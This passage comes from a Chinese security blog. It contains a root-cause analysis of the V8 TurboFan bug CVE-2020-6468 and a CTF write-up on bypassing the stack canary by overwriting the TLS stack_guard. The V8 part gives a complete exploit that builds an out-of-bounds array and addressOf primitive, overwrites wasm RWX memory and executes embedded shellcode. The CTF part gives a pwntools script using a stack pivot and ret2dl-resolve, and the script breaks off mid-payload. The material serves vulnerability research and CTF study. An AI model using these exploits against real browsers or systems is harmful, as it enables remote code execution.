&#125;&#125;\n这个函数才是将节点真正的添加到block中，之前的流程只是建立了对应表，并没有实际写入。SerializeRPOIntoSchedule函数是确立block的RPO Number，与我们前面所指代的BlockID不一样，前面我们指代的BlockID特指其建立的顺序，即它是按找顺序下来的；而这里的RPO Number才是我们在输出文件中看到的基本块的真正标号可以知道这里是按链表顺序来确立RPO的，之前的一系列流程中block之间通过rpo_next()建立了先后的顺序。\n// Serialize the previously computed order as a special reverse-post-order// numbering for basic blocks into the final schedule.void SerializeRPOIntoSchedule() &#123;  int32_t number = 0;  for (BasicBlock* b = order_; b != nullptr; b = b-&gt;rpo_next()) &#123;    b-&gt;set_rpo_number(number++);    schedule_-&gt;rpo_order()-&gt;push_back(b);  &#125;  BeyondEndSentinel()-&gt;set_rpo_number(number);&#125;\n调试如下\nIn file: /home/hi/Desktop/v8/src/compiler/scheduler.cc   1733   for (NodeVector* nodes : scheduled_nodes_) &#123;   1734     BasicBlock::Id id = BasicBlock::Id::FromInt(block_num++);   1735     BasicBlock* block = schedule_-&gt;GetBlockById(id);   1736     if (nodes) &#123;   1737       for (Node* node : base::Reversed(*nodes)) &#123; ► 1738         schedule_-&gt;AddNode(block, node);   1739       &#125;   1740     &#125;   1741   &#125;   1742 &#125;   1743 pwndbg&gt; p node-&gt;id()$62 = 76pwndbg&gt; p block-&gt;id()$63 = &#123;  index_ = 3&#125;pwndbg&gt; p block-&gt;rpo_number_$65 = 4...............................pwndbg&gt; p block-&gt;id()       $66 = &#123;  index_ = 7&#125;pwndbg&gt; p node-&gt;id()        $67 = 469pwndbg&gt; p block-&gt;rpo_number_$68 = 5\n可以知道，469属于B5，而76属于B4，位于了B5的前面，这与我们看到的结果吻合\n其他问题由此，我们漏洞原理已经搞清楚了，还有几个地方需要解决。为什么在第一次大量循环触发优化以后，还需要再来第二次大量循环触发优化，opt函数中为什么要弄一个分支？\nfunction opt(arg1,arg2) &#123;   if (arg2 == 666) &#123;      return 666;   &#125;   .............&#125;for (let i=0;i&lt;10000;i++) &#123;   opt(A,0);   opt(B,0);&#125;for (let i=0;i&lt;5000;i++) &#123;   opt(A,666);   opt(B,666);&#125;\n经过测试和经验，发现当代码中存在这种Unreachable节点时，优化的函数不会被触发到\nfunction opt(arg) &#123;   arr[0] = 4.4;   var a = new Uint8Array(10);   a[0x100000000] = 2;   return 1;&#125;var arr = [1.1,2.2,3.3];for (var i=0;i&lt;10000;i++) &#123;   opt(arr);&#125;arr = [1.1,2.2,3.3];%SystemBreak();opt(arr);\n为了能够触发到优化的函数，使用分支来欺骗编译器的deoptimization反馈\nfunction opt(arg,arg2) &#123;   if (arg2 == 666) &#123;      return 666;   &#125;   arr[0] = 4.4;   var a = new Uint8Array(10);   a[0x100000000] = 2;   return 1;&#125;var arr = [1.1,2.2,3.3];for (var i=0;i&lt;10000;i++) &#123;   opt(arr,0);&#125;for (var i=0;i&lt;5000;i++) &#123;   opt(arr,666);&#125;arr = [1.1,2.2,3.3];%SystemBreak();opt(arr);\n这样以后发现在gdb中能够成功在JIT代码处断点断下有了这个小trick以后，我们就可以构造OOB数组了，首先让opt函数优化处理对象，优化后的代码为\n..........................................................0x3d35000847e5    e5  41c7400bfeffffff movl [r8+0xb],0xfffffffe0x3d35000847ed    ed  4c8b5de0       REX.W movq r11,[rbp-0x20]0x3d35000847f1    f1  458b63ff       movl r12,[r11-0x1]0x3d35000847f5    f5  4c8b15c7ffffff REX.W movq r10,[rip+0xffffffc7]0x3d35000847fc    fc  4d39e2         REX.W cmpq r10,r120x3d35000847ff    ff  7312           jnc 0x3d3500084813  &lt;+0x113&gt;0x3d3500084801   101  488b15caffffff REX.W movq rdx,[rip+0xffffffca]0x3d3500084808   108  4c8b1509ffffff REX.W movq r10,[rip+0xffffff09]0x3d350008480f   10f  41ffd2         call r100x3d3500084812   112  cc             int3l0x3d3500084813   113  41bee1042808   movl r14,0x82804e1      ;; (compressed) object: 0x3d35082804e1 &lt;Map(UINT8ELEMENTS)&gt;0x3d3500084819   119  4539e6         cmpl r14,r120x3d350008481c   11c  0f85a0000000   jnz 0x3d35000848c2  &lt;+0x1c2&gt;0x3d3500084822   122  49bc692e2508353d0000 REX.W movq r12,0x3d3508252e69    ;; object: 0x3d3508252e69 &lt;HeapNumber 4294967296.0&gt;0x3d350008482c   12c  41f6c401       testb r12,0x10x3d3500084830   130  0f8598000000   jnz 0x3d35000848ce  &lt;+0x1ce&gt;0x3d3500084836   136  cc             int3l0x3d3500084837   137  41bca9502808   movl r12,0x82850a9      ;; (compressed) object: 0x3d35082850a9 &lt;Map(HOLEY_ELEMENTS)&gt;0x3d350008483d   13d  453be1         cmpl r12,r90x3d3500084840   140  0f8420000000   jz 0x3d3500084866  &lt;+0x166&gt;0x3d3500084846   146  e90f000000     jmp 0x3d350008485a  &lt;+0x15a&gt;0x3d350008484b   14b  41bce14f2808   movl r12,0x8284fe1      ;; (compressed) object: 0x3d3508284fe1 &lt;Map(HOLEY_ELEMENTS)&gt;0x3d3500084851   151  453be1         cmpl r12,r9......................................................\n可以看到，先执行了movl [r8+0xb],0xfffffffe，后面才是类型检查，而对于数组对象0xb处正好是length，该字段被修改为负数，因此构造了一个OOB数组。后续就可以很方便利用了。本文为了便于调试，我们将某些DCHECK注释掉了，如下是patch\ndiff --git a/src/compiler/backend/code-generator.cc b/src/compiler/backend/code-generator.ccindex a441a36496..02ae7c7d23 100644--- a/src/compiler/backend/code-generator.cc+++ b/src/compiler/backend/code-generator.cc@@ -701,10 +701,10 @@ CodeGenerator::CodeGenResult CodeGenerator::AssembleInstruction(   if (adjust_stack) AssembleTailCallBeforeGap(instr, first_unused_stack_slot);   AssembleGaps(instr);   if (adjust_stack) AssembleTailCallAfterGap(instr, first_unused_stack_slot);-  DCHECK_IMPLIES(+  /*DCHECK_IMPLIES(       block-&gt;must_deconstruct_frame(),       instr != instructions()-&gt;InstructionAt(block-&gt;last_instruction_index()) ||-          instr-&gt;IsRet() || instr-&gt;IsJump());+          instr-&gt;IsRet() || instr-&gt;IsJump());*/   if (instr-&gt;IsJump() &amp;&amp; block-&gt;must_deconstruct_frame()) &#123;     AssembleDeconstructFrame();   &#125;diff --git a/src/compiler/backend/frame-elider.cc b/src/compiler/backend/frame-elider.ccindex 293fc9352c..1d50bb5dd2 100644--- a/src/compiler/backend/frame-elider.cc+++ b/src/compiler/backend/frame-elider.cc@@ -49,7 +49,7 @@ void FrameElider::MarkDeConstruction() &#123;       // deconstructions.       for (RpoNumber&amp; succ : block-&gt;successors()) &#123;         if (!InstructionBlockAt(succ)-&gt;needs_frame()) &#123;-          DCHECK_EQ(1U, block-&gt;SuccessorCount());+          //DCHECK_EQ(1U, block-&gt;SuccessorCount());           const Instruction* last =               InstructionAt(block-&gt;last_instruction_index());           if (last-&gt;IsThrow() || last-&gt;IsTailCall() ||@@ -59,7 +59,7 @@ void FrameElider::MarkDeConstruction() &#123;             continue;           &#125;           // The only cases when we need to deconstruct are ret and jump.-          DCHECK(last-&gt;IsRet() || last-&gt;IsJump());+          //DCHECK(last-&gt;IsRet() || last-&gt;IsJump());           block-&gt;mark_must_deconstruct_frame();         &#125;       &#125;diff --git a/src/compiler/backend/instruction.cc b/src/compiler/backend/instruction.ccindex f4c09a7cf4..5b5cc27924 100644--- a/src/compiler/backend/instruction.cc+++ b/src/compiler/backend/instruction.cc@@ -700,12 +700,12 @@ void InstructionSequence::ValidateEdgeSplitForm() const &#123;   // has an edge to a block (== a successor) with more than one predecessors.   for (const InstructionBlock* block : instruction_blocks()) &#123;     if (block-&gt;SuccessorCount() &gt; 1) &#123;-      for (const RpoNumber&amp; successor_id : block-&gt;successors()) &#123;-        const InstructionBlock* successor = InstructionBlockAt(successor_id);-        // Expect precisely one predecessor: &quot;block&quot;.+      /*for (const RpoNumber&amp; successor_id : block-&gt;successors()) &#123;+        //const InstructionBlock* successor = InstructionBlockAt(successor_id);+        //Expect precisely one predecessor: &quot;block&quot;.         CHECK(successor-&gt;PredecessorCount() == 1 &amp;&amp;               successor-&gt;predecessors()[0] == block-&gt;rpo_number());-      &#125;+      &#125;*/     &#125;   &#125; &#125;diff --git a/src/compiler/dead-code-elimination.cc b/src/compiler/dead-code-elimination.ccindex f39e6cabfb..4ec7703947 100644--- a/src/compiler/dead-code-elimination.cc+++ b/src/compiler/dead-code-elimination.cc@@ -317,7 +317,7 @@ Reduction DeadCodeElimination::ReduceDeoptimizeOrReturnOrTerminateOrTailCall(          node-&gt;opcode() == IrOpcode::kTailCall);   Reduction reduction = PropagateDeadControl(node);   if (reduction.Changed()) return reduction;-  if (FindDeadInput(node) != nullptr) &#123;+  if (node-&gt;opcode() != IrOpcode::kTerminate &amp;&amp; FindDeadInput(node) != nullptr) &#123;     Node* effect = NodeProperties::GetEffectInput(node, 0);     Node* control = NodeProperties::GetControlInput(node, 0);     if (effect-&gt;opcode() != IrOpcode::kUnreachable) &#123;diff --git a/src/compiler/pipeline.cc b/src/compiler/pipeline.ccindex e7285f0074..8d157c1eba 100644--- a/src/compiler/pipeline.cc+++ b/src/compiler/pipeline.cc@@ -815,7 +815,7 @@ void TraceScheduleAndVerify(OptimizedCompilationInfo* info, PipelineData* data,     os &lt;&lt; &quot;-- Schedule --------------------------------------\\n&quot; &lt;&lt; *schedule;   &#125; -  if (FLAG_turbo_verify) ScheduleVerifier::Run(schedule);+  //if (FLAG_turbo_verify) ScheduleVerifier::Run(schedule); &#125;  class SourcePositionWrapper final : public Reducer &#123;diff --git a/src/compiler/schedule.cc b/src/compiler/schedule.ccindex 8bdcef511b..a232867d5c 100644--- a/src/compiler/schedule.cc+++ b/src/compiler/schedule.cc@@ -253,7 +253,7 @@ void Schedule::AddCall(BasicBlock* block, Node* call, BasicBlock* success_block,  void Schedule::AddBranch(BasicBlock* block, Node* branch, BasicBlock* tblock,                          BasicBlock* fblock) &#123;-  DCHECK_EQ(BasicBlock::kNone, block-&gt;control());+  //DCHECK_EQ(BasicBlock::kNone, block-&gt;control());   DCHECK_EQ(IrOpcode::kBranch, branch-&gt;opcode());   block-&gt;set_control(BasicBlock::kBranch);   AddSuccessor(block, tblock);@@ -294,7 +294,7 @@ void Schedule::AddDeoptimize(BasicBlock* block, Node* input) &#123; &#125;  void Schedule::AddThrow(BasicBlock* block, Node* input) &#123;-  DCHECK_EQ(BasicBlock::kNone, block-&gt;control());+  //DCHECK_EQ(BasicBlock::kNone, block-&gt;control());   block-&gt;set_control(BasicBlock::kThrow);   SetControlInput(block, input);   if (block != end()) AddSuccessor(block, end());diff --git a/src/compiler/scheduler.cc b/src/compiler/scheduler.ccindex 0b0a548411..4eff63eb4c 100644--- a/src/compiler/scheduler.cc+++ b/src/compiler/scheduler.cc@@ -1418,7 +1418,7 @@ class ScheduleLateNodeVisitor &#123;      // The schedule early block dominates the schedule late block.     BasicBlock* min_block = scheduler_-&gt;GetData(node)-&gt;minimum_block_;-    DCHECK_EQ(min_block, BasicBlock::GetCommonDominator(block, min_block));+    //DCHECK_EQ(min_block, BasicBlock::GetCommonDominator(block, min_block));     TRACE(         &quot;Schedule late of #%d:%s is id:%d at loop depth %d, minimum = id:%d\\n&quot;,         node-&gt;id(), node-&gt;op()-&gt;mnemonic(), block-&gt;id().ToInt(),\n\n漏洞利用由于release版本中不存在DCHECK，因此该漏洞可以直接在release版本中被利用EXP\nvar buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function i2f64(value) &#123;   dv.setBigUint64(0,BigInt(value),true);   return dv.getFloat64(0,true);&#125;function u64f(value) &#123;   dv.setFloat64(0,value,true);   return dv.getBigUint64(0,true);&#125;class classA &#123;  constructor() &#123;    this.val = 0x4242;    this.x = 0;  &#125;&#125;class classB &#123;  constructor() &#123;    this.val = 0x4141;    this.x = &quot;AAA&quot;;  &#125;&#125;var A = new classA();var B = new classB();function opt(arg1,arg2) &#123;   if (arg2 == 666) &#123;      return 666;   &#125;   var a = new Uint8Array(10);   arg1.val = -1;   a[0x100000000] = 2;   async function deadcode() &#123;      const obj = &#123;&#125;;      while (1) &#123;         if (badbeef + a + b + c*d) &#123;             while (obj) &#123;                await 666;                dead(beef);             &#125;         &#125;      &#125;   &#125;   deadcode();&#125;for (let i=0;i&lt;20000;i++) &#123;   opt(A,0);   opt(B,0);&#125;for (let i=0;i&lt;10000;i++) &#123;   opt(A,666);   opt(B,666);&#125;var oob = [1.1,2.2,3.3];var obj_arr = [&#123;&#125;];var float64arr = new Float64Array(1.1,2.2);var arr_buf = new ArrayBuffer(0x10);opt(oob,0);print(&quot;[+] oob length=&quot; + oob.length);var compression_high = u64f(oob[0x19]) &amp; 0xffffffff00000000n;print(&quot;[+] compression_high=0x&quot; + compression_high.toString(16));function addressOf(obj) &#123;   obj_arr[0] = obj;   return compression_high + ((u64f(oob[0x6]) - 0x1n) &amp; 0xffffffffn);&#125;const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var func = wasmInstance.exports.main;var wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x68n;print(&quot;[+] wasm_shellcode_ptr_addr=0x&quot; + wasm_shellcode_ptr_addr.toString(16));/*%DebugPrint(wasmInstance);%DebugPrint(oob);%DebugPrint(obj_arr);%DebugPrint(float64arr);%DebugPrint(arr_buf);%SystemBreak();*/oob[0x1e] = i2f64(0x100);oob[0x1f] = i2f64(wasm_shellcode_ptr_addr);var adv = new DataView(arr_buf);var wasm_shellcode_addr = adv.getBigUint64(0,true);print(&#x27;[+] wasm_shellcode_addr=0x&#x27; + wasm_shellcode_addr.toString(16));oob[0x1f] = i2f64(wasm_shellcode_addr);//替换wasm的shellcodefor (var i=0;i&lt;shellcode.length;i++) &#123;   adv.setUint32(i*4,shellcode[i],true);&#125;//执行shellcodefunc();\n执行效果\n0x04 补充回顾V8 schedule阶段的设计，可以发现对于每一个控制流节点的添加，都增加了DCHECK_EQ(BasicBlock::kNone, block-&gt;control());的检查\nvoid ConnectThrow(Node* thr) &#123;  Node* throw_control = NodeProperties::GetControlInput(thr);  BasicBlock* throw_block = FindPredecessorBlock(throw_control);  TraceConnect(thr, throw_block, nullptr);  schedule_-&gt;AddThrow(throw_block, thr);&#125;void Schedule::AddThrow(BasicBlock* block, Node* input) &#123;  DCHECK_EQ(BasicBlock::kNone, block-&gt;control());  block-&gt;set_control(BasicBlock::kThrow);  SetControlInput(block, input);  if (block != end()) AddSuccessor(block, end());&#125;void Schedule::SetControlInput(BasicBlock* block, Node* node) &#123;  block-&gt;set_control_input(node);  SetBlockForNode(block, node);&#125;void Schedule::SetBlockForNode(BasicBlock* block, Node* node) &#123;  if (node-&gt;id() &gt;= nodeid_to_block_.size()) &#123;    nodeid_to_block_.resize(node-&gt;id() + 1);  &#125;  nodeid_to_block_[node-&gt;id()] = block;&#125;\n这是因为要跳出一个基本块，只能是通过一个出口出去导致DCHECK未通过的阶段发生在EffectControlLinearizationPhase，我们来分析一下这个阶段\nstruct EffectControlLinearizationPhase &#123;  DECL_PIPELINE_PHASE_CONSTANTS(EffectLinearization)  void Run(PipelineData* data, Zone* temp_zone) &#123;    &#123;      // The scheduler requires the graphs to be trimmed, so trim now.      // TODO(jarin) Remove the trimming once the scheduler can handle untrimmed      // graphs.      GraphTrimmer trimmer(temp_zone, data-&gt;graph());      NodeVector roots(temp_zone);      data-&gt;jsgraph()-&gt;GetCachedNodes(&amp;roots);      trimmer.TrimGraph(roots.begin(), roots.end());      // Schedule the graph without node splitting so that we can      // fix the effect and control flow for nodes with low-level side      // effects (such as changing representation to tagged or      // &#x27;floating&#x27; allocation regions.)      Schedule* schedule = Scheduler::ComputeSchedule(          temp_zone, data-&gt;graph(), Scheduler::kTempSchedule,          &amp;data-&gt;info()-&gt;tick_counter());      TraceScheduleAndVerify(data-&gt;info(), data, schedule,                             &quot;effect linearization schedule&quot;);      MaskArrayIndexEnable mask_array_index =          (data-&gt;info()-&gt;GetPoisoningMitigationLevel() !=           PoisoningMitigationLevel::kDontPoison)              ? MaskArrayIndexEnable::kMaskArrayIndex              : MaskArrayIndexEnable::kDoNotMaskArrayIndex;      // Post-pass for wiring the control/effects      // - connect allocating representation changes into the control&amp;effect      //   chains and lower them,      // - get rid of the region markers,      // - introduce effect phis and rewire effects to get SSA again.      LinearizeEffectControl(data-&gt;jsgraph(), schedule, temp_zone,                             data-&gt;source_positions(), data-&gt;node_origins(),                             mask_array_index, MaintainSchedule::kDiscard);    &#125;    &#123;      // The &#123;EffectControlLinearizer&#125; might leave &#123;Dead&#125; nodes behind, so we      // run &#123;DeadCodeElimination&#125; to prune these parts of the graph.      // Also, the following store-store elimination phase greatly benefits from      // doing a common operator reducer and dead code elimination just before      // it, to eliminate conditional deopts with a constant condition.      GraphReducer graph_reducer(temp_zone, data-&gt;graph(),                                 &amp;data-&gt;info()-&gt;tick_counter(),                                 data-&gt;jsgraph()-&gt;Dead());      DeadCodeElimination dead_code_elimination(&amp;graph_reducer, data-&gt;graph(),                                                data-&gt;common(), temp_zone);      CommonOperatorReducer common_reducer(&amp;graph_reducer, data-&gt;graph(),                                           data-&gt;broker(), data-&gt;common(),                                           data-&gt;machine(), temp_zone);      AddReducer(data, &amp;graph_reducer, &amp;dead_code_elimination);      AddReducer(data, &amp;graph_reducer, &amp;common_reducer);      graph_reducer.ReduceGraph();    &#125;  &#125;&#125;;\n其中的Scheduler::ComputeSchedule生成了中间代码，这个过程中BuildCFG中的ConnectBlocks操作触发了DCHECK当出现多个Throw时，由于他们属于同一个基本块遍历节点是从End开始进行广度优先搜索的，因此134:Throw先遍历到，经过AddThrow以后，134被归到到了73:Call所在的Block中，同时block中保留了control_指针指向134，接下来，遇到173:Throw，再一次来到AddThrow，由于在Release版本中没有DCHECK，因此程序继续执行，block中的control_指针被覆盖为173:Throw，同时,173:Throw也归到73:Call所在的Block中。与正常的情况比起来，两者的结果唯一的不同点在于134:Throw被归到了73：Call的Block中。在effect linearization schedule阶段生成完成的中间代码被传入LinearizeEffectControl，该阶段主要调用EffectControlLinearizer::Run，用于优化一些不必要的Effect链。\nvoid EffectControlLinearizer::Run() &#123;  BlockEffectControlMap block_effects(temp_zone());  ZoneVector&lt;PendingEffectPhi&gt; pending_effect_phis(temp_zone());  ZoneVector&lt;BasicBlock*&gt; pending_block_controls(temp_zone());  NodeVector inputs_buffer(temp_zone());  // TODO(rmcilroy) We should not depend on having rpo_order on schedule, and  // instead just do our own RPO walk here.  for (BasicBlock* block : *(schedule()-&gt;rpo_order())) &#123;    gasm()-&gt;Reset(block);    BasicBlock::iterator instr = block-&gt;begin();    BasicBlock::iterator end_instr = block-&gt;end();    // The control node should be the first.    Node* control = *instr;............................    // Process the ordinary instructions.    for (; instr != end_instr; instr++) &#123;      Node* node = *instr;      ProcessNode(node, &amp;frame_state);    &#125;    block = gasm()-&gt;FinalizeCurrentBlock(block);    switch (block-&gt;control()) &#123;      case BasicBlock::kGoto:      case BasicBlock::kNone:        break;      case BasicBlock::kCall:      case BasicBlock::kTailCall:      case BasicBlock::kSwitch:      case BasicBlock::kReturn:      case BasicBlock::kDeoptimize:      case BasicBlock::kThrow:      case BasicBlock::kBranch:        UpdateEffectControlForNode(block-&gt;control_input());        gasm()-&gt;UpdateEffectControlWith(block-&gt;control_input());        break;    &#125;........................&#125;\n其中ProcessNode代码如下\nvoid EffectControlLinearizer::ProcessNode(Node* node, Node** frame_state) &#123;  SourcePositionTable::Scope scope(source_positions_,                                   source_positions_-&gt;GetSourcePosition(node));  NodeOriginTable::Scope origin_scope(node_origins_, &quot;process node&quot;, node);  // If basic block is unreachable after this point, update the node&#x27;s effect  // and control inputs to mark it as dead, but don&#x27;t process further.  if (gasm()-&gt;effect() == jsgraph()-&gt;Dead()) &#123;    UpdateEffectControlForNode(node);    return;  &#125;.............................  if (node-&gt;opcode() == IrOpcode::kUnreachable) &#123;    // Break the effect chain on &#123;Unreachable&#125; and reconnect to the graph end.    // Mark the following code for deletion by connecting to the &#123;Dead&#125; node.    gasm()-&gt;ConnectUnreachableToEnd();  &#125;&#125;\n其中注意到当遍历到Unreachable节点时，会调用ConnectUnreachableToEnd函数\nvoid GraphAssembler::ConnectUnreachableToEnd() &#123;  DCHECK_EQ(effect()-&gt;opcode(), IrOpcode::kUnreachable);  Node* throw_node = graph()-&gt;NewNode(common()-&gt;Throw(), effect(), control());  NodeProperties::MergeControlToEnd(graph(), common(), throw_node);  effect_ = control_ = mcgraph()-&gt;Dead();  if (block_updater_) &#123;    block_updater_-&gt;AddThrow(throw_node);  &#125;&#125;\n该函数创建了一个新的Throw节点，并且且节点的control和effect继承自前面，该节点是之前424:CheckedTaggedToTaggedSigned Lower以后的节点\nIn file: /home/hi/Desktop/v8/src/compiler/graph-assembler.cc   817 &#125;   818    819 void GraphAssembler::ConnectUnreachableToEnd() &#123;   820   DCHECK_EQ(effect()-&gt;opcode(), IrOpcode::kUnreachable);   821   Node* throw_node = graph()-&gt;NewNode(common()-&gt;Throw(), effect(), control()); ► 822   NodeProperties::MergeControlToEnd(graph(), common(), throw_node);   823   effect_ = control_ = mcgraph()-&gt;Dead();   824   if (block_updater_) &#123;   825     block_updater_-&gt;AddThrow(throw_node);   826   &#125;   827 &#125;pwndbg&gt; p control_-&gt;id()$31 = 479pwndbg&gt; p effect_-&gt;id()$32 = 423\n同时我们注意到effect_ = control_ = mcgraph()-&gt;Dead();清空了effect_和control_，那么接下来遍历到的节点将不存在effect_和control_。480:Throw是当前block的最后一个节点，因此遍历结束，来到switch中\n................      case BasicBlock::kThrow:      case BasicBlock::kBranch:        UpdateEffectControlForNode(block-&gt;control_input());        gasm()-&gt;UpdateEffectControlWith(block-&gt;control_input());        break;..............\n首先会调用UpdateEffectControlForNode函数更新480:Throw的control\nvoid EffectControlLinearizer::UpdateEffectControlForNode(Node* node) &#123;  // If the node takes an effect, replace with the current one.  if (node-&gt;op()-&gt;EffectInputCount() &gt; 0) &#123;    DCHECK_EQ(1, node-&gt;op()-&gt;EffectInputCount());    NodeProperties::ReplaceEffectInput(node, gasm()-&gt;effect());  &#125; else &#123;    // New effect chain is only started with a Start or ValueEffect node.    DCHECK(node-&gt;op()-&gt;EffectOutputCount() == 0 ||           node-&gt;opcode() == IrOpcode::kStart);  &#125;  // Rewire control inputs.  for (int i = 0; i &lt; node-&gt;op()-&gt;ControlInputCount(); i++) &#123;    NodeProperties::ReplaceControlInput(node, gasm()-&gt;control(), i);  &#125;&#125;\n但是上一步已经将control和effect设置为Dead()了，因此480:Throw的control和effect都设置为了Dead。再回到本节的最开始的问题来看，两个Throw节点，134和173，它们都属于同一个基本块，且位于Unreachable的efrfect链中，但是AddThrow中SetControlInput操作是会更新的，导致block-&gt;control_input()的值是最后一次更新上去的节点值，即173:Throw，由于该节点的control和effect在EffectControlLinearizer::ProcessNode中都被设置为Dead，后续会在DeadCodeElimination中会被消除掉。优化以后的图中虽然仍有两个Throw节点，但此时它们之间不再是属于同一个基本块了，没有冲突。从以上的分析来看，整个流程都是需要保证一个基本块中只有一个control_input()，如果有多个，那么将只会处理最后更新上去的那个。这是解释了为什么在AddXXXX时需要增加DCHECK事先检查block是否已经存在control_input。因此，134:Throw虽然在Unreachable的effect链中，但是逃过了被消除的风险，一直到最后都能保留在IR图中。使得这些普通节点都可以”抄近路”来到外层的基本块中。然而469:DeoptimizeUnless抄不了近路，因为有Merge节点。\n0x05 小结本漏洞是因为LOOP优化时，通过某种特殊的条件，将Terminate节点换成Throw节点，使得Terminate节点以”换汤不换药”的形式保留在了IR图中，一直到最后一个阶段，其仍然被保留。导致最后的schedule阶段划分基本块时可以”抄近路”，使得原本位于内联中的基本块中的节点分到了外部的基本块中，因为外部基本块总是先执行到，这也就是导致了对一个对象进行操作时，可以先写数据，再进行类型检查。\n0x06 感想通过本次漏洞复现，加深了对V8的IR图的理解，同时也明白了V8是如何根据图来划分基本代码块的，对V8整个优化阶段有了实践性的认识，收获很大。同时感慨漏洞发现人的高明，这个POC蕴含的知识是如此的复杂，看来还得再继续深入学习。\n0x07 参考CVE-2020-6468 分析Turbofan IRMeaning of merge, phi, effectphi and dead in v8 terminologygdb多线程下禁止线程切换V8 TurboFan 生成图简析构造Dominator Tree以及Dominator FrontierIssue 1076708: OOB read&#x2F;write in v8\n","categories":["CTF","安全研究"],"tags":["JS引擎漏洞","类型混淆"]},{"title":"BFnote(修改TLS结构来bypass canary)","url":"/2020/02/24/i%E6%98%A5%E7%A7%8B2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9PWN_BFnote/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n\n\n一开始处，有一个栈溢出漏洞，但是由于开启了canary保护，得想办法绕过canary。下方的堆溢出，[不仔细看还发现不了，v4只有一开始被初始化，在循环里，只有i被重新赋值，v4没变，而下方又用到了v4。]{.mark}\n这题是可以绕过canary的，这就牵涉到了一个知识点。\n在linux下，有一种线程局部存储（Thread Local Storage）机制，简称TLS。它主要存储着一个线程的一些全局变量。它的结构如下\ntypedef struct  &#123;    void *tcb;        /* Pointer to the TCB.  Not necessarily the                 thread descriptor used by libpthread.  */    dtv_t *dtv;    void *self;       /* Pointer to the thread descriptor.  */    int multiple_threads;    int gscope_flag;    uintptr_t sysinfo;    uintptr_t stack_guard;    uintptr_t pointer_guard;    ...  &#125; tcbhead_t;  \n\n而我们的canary是怎么取得的呢\n\n\n而gs或者fs寄存器就正好指向的是这个结构。结构里的uintptr_t stack_guard就是canary值，因此，绕过我们能利用漏洞篡改这个结构里的stack_guard值，也就可以绕过canary了。\n在glibc2.23中，[这个结构存储在一块mmap出的内存里，在libc.so的上方，如果是其他版本的glibc，则不一定。]{.mark}\n\n\n如果我们能够**[申请一块堆到debug001的上方，利用堆溢出，便能修改到debug001，也就是能修改到TLS结构。]{.mark}**正好，本题malloc的大小不受限制，我们只需要malloc一个很大的堆&gt;&#x3D;0x20000，malloc就会使用mmap来分配内存，正好可以分配到debug001上方。\n当我们申请到了上方后，不能直接覆盖TLS结构，因为在[stack_guard]{.mark} 变量前面的几个变量更系统调用有关，不能改了，因此我们不能覆盖，而应该单独修改[stack_guard]{.mark}的值。那么我们可以利用下标越界溢出来修改\n\n\n通过调试，计算出偏移，然后修改即可。\n#mmap一个合适堆，在glibc2.23下可以分配到TLS结构上方附近  sh.sendlineafter(&#x27;Give your notebook size : &#x27;,str(1024*130))  overflow_len = 0x216FC  #初始化v4  sh.sendlineafter(&#x27;Give your title size : &#x27;,str(overflow_len))  sh.sendlineafter(&#x27;invalid ! please re-enter :&#x27;,&#x27;1&#x27;)  sh.sendafter(&#x27;Give your title : &#x27;,&#x27;a&#x27;)  #绕过canary的重点在这里，将TLS里的canary覆盖为aaaa  #raw_input()  sh.sendafter(&#x27;Give your note :&#x27;,&#x27;aaaa&#x27;)\n\n接下来，就是一个栈溢出了。\n\n\n但是在ebp上方，取ecx的值作为地址取一个值，这意味着，我们不能覆盖ebp+var_4，这也就意味着我们不能覆盖到main函数的返回地址。\n由此，[我们将ebp+var_4覆盖为bss的地址，这样，就可以栈迁移到bss段，然后在bss段进行ROP。]{.mark}\n然后，我们注意到**[本题的输出，用的是fwrite、fprintf，这使得我们很难找到合适的gadget来控制参数。并且，这些函数的空间花销很大]{.mark}**，调用需要开辟较大的栈空间，但是我们的bss段不允许。\n\n\n经过再三的思考，最终，我们用到了ret2dl-resolve来解。Ret2dl-resolve详见https://blog.csdn.net/seaaseesa/article/details/104478081，通过伪造link_map，实现任意函数，任意地址动态解析。[用ret2dl-resolve时，需要注意对齐。不然偏移计算会有偏差]{.mark}\n综上，我们的exp脚本\n#coding:utf8  #32位下的ret2dl-resolve，伪造link_map实现任意地址解析  from pwn import *    sh = process(&#x27;./BFnote&#x27;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)  #sh = remote(&#x27;123.56.85.29&#x27;,6987)  libc = ELF(&#x27;./libc.so.6&#x27;)  elf = ELF(&#x27;./BFnote&#x27;)  read_got = elf.got[&#x27;read&#x27;]  read_plt = elf.plt[&#x27;read&#x27;]  bss = 0x804A040  pop_ebp = 0x80489db  leave_ret = 0x8048578  one_gadget = 0x3a80c    l_addr = one_gadget - libc.sym[&#x27;read&#x27;]  #注意，只要是可读写的内存地址即可，调试看看就知道了  r_offset = bss + l_addr * -1    #负数需要补码  if l_addr &lt; 0:     l_addr = l_addr + 0x100000000    #栈迁移  payload = &#x27;a&#x27;*0x3A + p32(bss+0x100)  